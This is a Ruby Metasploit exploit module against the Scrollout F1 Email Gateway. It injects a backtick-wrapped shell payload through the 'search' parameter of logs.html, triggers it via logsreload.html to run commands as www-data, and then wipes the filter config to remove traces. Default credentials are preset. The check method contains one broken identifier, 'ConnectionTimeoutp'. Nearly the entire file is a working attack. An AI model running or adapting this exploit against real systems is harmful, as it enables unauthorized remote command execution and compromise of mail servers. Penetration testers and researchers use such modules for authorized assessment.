##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Scrollout F1 Email Gateway loadLogs Command Execution',
			'Description'    => %q{
				This module exploits a command execution vulnerability in Scrollout F1
				version 2012-10-03 which could be abused to allow authenticated users to
				execute arbitrary commands under the context of the 'www-data' user.
				The 'loadLogs' function in the 'logsreload.php' file calls 'shell_exec()'
				with user controlled data from the 'search' parameter.
			},
			'References'     =>
				[
					['URL', 'http://itsecuritysolutions.org/2013-01-29-Scrollout-arbitrary-command-execution-vulnerability'],
				],
			'Author'         =>
				[
					'Brendan Coles <bcoles[at]gmail.com>', # Discovery and exploit
				],
			'License'        => MSF_LICENSE,
			'Privileged'     => true,
			'Arch'           => ARCH_CMD,
			'Platform'       => 'unix',
			'Payload'        =>
				{
					'BadChars'    => "\x00",
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'python perl bash netcat-e',
						},
				},
			'Targets'        =>
				[
					['Automatic Targeting', { 'auto' => true }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => "Jan 29 2013",
		))

		register_options([
			OptBool.new('SSL', [true, 'Use SSL', false]),
			OptString.new('BasicAuthUser', [true, 'The Scrollout username', 'Admin']),
			OptString.new('BasicAuthPass', [true, 'The Scrollout password', '123456']),
			OptString.new('TARGETURI', [true, 'The path to the web application', '/']),
		], self.class)
	end

	def check

		peer    = "#{rhost}:#{rport}"
		base    = target_uri.path
		base    << '/' if base[-1, 1] != '/'
		user    = datastore['BasicAuthUser']

		# send check
		print_status("#{peer} - Authenticating as user '#{user}'")
		begin
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => "#{base}",
			})
			if res and res.code == 401
				print_error("#{peer} - Authentication failed")
				return Exploit::CheckCode::Unknown
			elsif res and res.code == 200 and res.body =~ /<title>Scrollout F1<\/title>/
				return Exploit::CheckCode::Detected
			end
			return Exploit::CheckCode::Safe
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeoutp
			print_error("#{peer} - Connection failed")
		end
		return Exploit::CheckCode::Unknown

	end

	def exploit

		@peer    = "#{rhost}:#{rport}"
		base     = target_uri.path
		base    << '/' if base[-1, 1] != '/'
		command  = Rex::Text.uri_encode(payload.encoded)

		# send payload
		print_status("#{@peer} - Sending payload (#{command.length} bytes)")
		begin
			res = send_request_cgi({
				'method'    => 'POST',
				'uri'       => "#{base}logs.html",
				'data'      => "search=`#{command}`",
			})
			if res and res.code == 200
				print_good("#{@peer} - Payload sent successfully")
			elsif res and res.code == 401
				fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
			else
				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Sending payload failed")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end

		# send payload trigger
		print_status("#{@peer} - Sending payload trigger")
		begin
			res = send_request_cgi({
				'method'    => 'GET',
				'uri'       => "#{base}logsreload.html",
			})
			if res and res.code == 200
				print_good("#{@peer} - Payload trigger sent successfully")
			elsif res and res.code == 401
				fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
			else
				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Triggering payload failed")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end

		# cleanup
		print_status("#{@peer} - Cleaning up config file (filter.cfg)")
		begin
			res = send_request_cgi({
				'method'    => 'POST',
				'uri'       => "#{base}logs.html",
				'data'      => "search=",
			})
			if res and res.code == 200
				print_good("#{@peer} - Cleaning completed successfully")
			elsif res and res.code == 401
				fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
			else
				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Cleaning failed")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
		end

	end

end

